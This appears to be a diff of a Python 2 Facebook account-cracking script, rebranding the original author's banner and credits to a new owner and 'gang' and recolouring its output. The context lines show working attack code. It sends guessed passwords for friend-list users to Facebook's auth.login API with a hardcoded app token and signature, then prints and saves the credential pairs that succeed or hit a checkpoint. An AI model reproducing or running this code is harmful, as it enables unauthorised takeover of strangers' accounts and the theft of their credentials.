@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # coding=utf-8
-# Originally Written By:Muhammad Hamza
+# Originally Written By:JAM SHAHRUKH
 # Source : Python2"
 # Donot Recode It. 
 
@@ -13,7 +13,7 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 hop.py')
+    os.system('python2 jam.py')
 
 #Browser Setting
 reload(sys)
@@ -55,23 +55,19 @@ def hamza(z):
 		
 ##### LOGO #####
 banner = """
-            _______    _______ 
-|\     /|  (  ___  )  (  ____ )
-| )   ( |  | (   ) |  | (    )|
-| (___) |  | |   | |  | (____)|
-|  ___  |  | |   | |  |  _____)
-| (   ) |  | |   | |  | (      
-| )   ( |  | (___) |  | )      
-|/     \|  (_______)  |/ 
-                                 
------------------------------------------------
-
-➣ Coder   : Muhammad Hamza
-➣ Github  : https://github.com/Hamzahash
-➣ Facebook: Muhammad Hamza
-➣ Youtube : HOP Anonymous
-
------------------------------------------------"""
+\033[1;92m___  ____   _ _____ _   __  ___   _   _ 
+\033[1;92m|  \/  | | | /  ___| | / / / _ \ | \ | |
+\033[1;92m| .  . | | | \ `--.| |/ / / /_\ \|  \| |
+\033[1;92m| |\/| | | | |`--. \    \ |  _  || . ` |
+\033[1;92m| |  | | |_| /\__/ / |\  \| | | || |\  |
+\033[1;92m\_|  |_/\___/\____/\_| \_/\_| |_/\_| \_/                                               
+\033[1;97m-----------------------------------------------
+\033[1;91m➣ OWNER   : JAM SHAHRUKH X MUSKAN NOOR
+\033[1;91m➣ Github  : https://github.com/muskanckg
+\033[1;91m➣ GANG    : CRAZY KING GANG
+\033[1;91m➣ Youtube : JAM SHAHRUKH TECHNICAL
+\033[1;91m➣ WhatsApp: +923053176060
+\033[1;97m-----------------------------------------------"""
 back = 0
 threads = []
 successful = []
@@ -87,7 +83,7 @@ def menu2():
 		os.system('clear')
 		print"[!] Token Not Found"
 		os.system('rm -rf login.txt')
-		os.system('python2 hop.py')
+		os.system('python2 jam.py')
 		time.sleep(1)
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
@@ -98,7 +94,7 @@ def menu2():
 		os.system('clear')
 		print"[!] Account Is On Checkpoint"
 		os.system('rm -rf login.txt')
-		os.system('python2 hop.py')
+		os.system('python2 jam.py')
 		time.sleep(1)
 	except requests.exceptions.ConnectionError:
 		print"[!] No Connection"
@@ -130,7 +126,7 @@ def menu2_menu():
         hamza('Please Wait.')
         hamza('While Is Returning To Main Menu.')
         time.sleep(1)
-        os.system('python2 .hop2.py')
+        os.system('python2 muskan.py')
     else:
         print "[!] Wrong Input."
         menu2_menu()
@@ -145,7 +141,7 @@ def choice1():
 		print("[!] Token invalid")
 		os.system("rm -rf login.txt")
 		time.sleep(1)
-		os.system("python2 hop.py")
+		os.system("python2 jam.py")
 	os.system("clear")
 	print banner
 	print ("[1] Crack From Friend List.")
@@ -243,11 +239,11 @@ def choice1_menu():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
+				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
+					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
 					crt = open("save/checkpoint.txt", "a")
 					crt.write(user+"|"+pass1+"\n")
 					crt.close()
@@ -257,11 +253,11 @@ def choice1_menu():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
-						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
+						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
+							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
 							crt = open("save/checkpoint.txt", "a")
 							crt.write(user+"|"+pass2+"\n")
 							crt.close()
@@ -271,11 +267,11 @@ def choice1_menu():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if "access_token" in q:
-								print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass3
+								print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass3
 								oks.append(user+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass3
+									print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass3
 									crt = open("save/checkpoint.txt", "a")
 									crt.write(user+"|"+pass3+"\n")
 									crt.close()
@@ -285,11 +281,11 @@ def choice1_menu():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if "access_token" in q:
-										print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass4
+										print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass4
 										oks.append(user+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass4
+											print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass4
 											crt = open("save/checkpoint.txt", "a")
 											crt.write(user+"|"+pass4+"\n")
 											crt.close()
@@ -299,11 +295,11 @@ def choice1_menu():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if "access_token" in q:
-												print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass5
+												print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass5
 												oks.append(user+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass5
+													print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass5
 													crt = open("save/checkpoint.txt", "a")
 													crt.write(user+"|"+pass5+"\n")
 													crt.close()
@@ -336,7 +332,7 @@ def choice2():
 		print("[!] Token invalid")
 		os.system("rm -rf login.txt")
 		time.sleep(1)
-		os.system("python2 hop.py")
+		os.system("python2 jam.py")
 	os.system("clear")
 	print banner
 	print ("[1] Crack From Friend List.")
@@ -423,11 +419,11 @@ def choice2_menu():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if "access_token" in q:
-				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass1
+				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
 				oks.append(user+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass1
+					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
 					crt = open("save/checkpoint.txt", "a")
 					crt.write(user+"|"+pass1+"\n")
 					crt.close()
@@ -437,11 +433,11 @@ def choice2_menu():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if "access_token" in q:
-						print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;30m ' + user + ' \x1b[1;97m|\x1b[1;30m ' + pass2
+						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
 						oks.append(user+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m ' + user + ' \x1b[1;97m|\x1b[1;97m ' + pass2
+							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
 							crt = open("save/checkpoint.txt", "a")
 							crt.write(user+"|"+pass2+"\n")
 							crt.close()
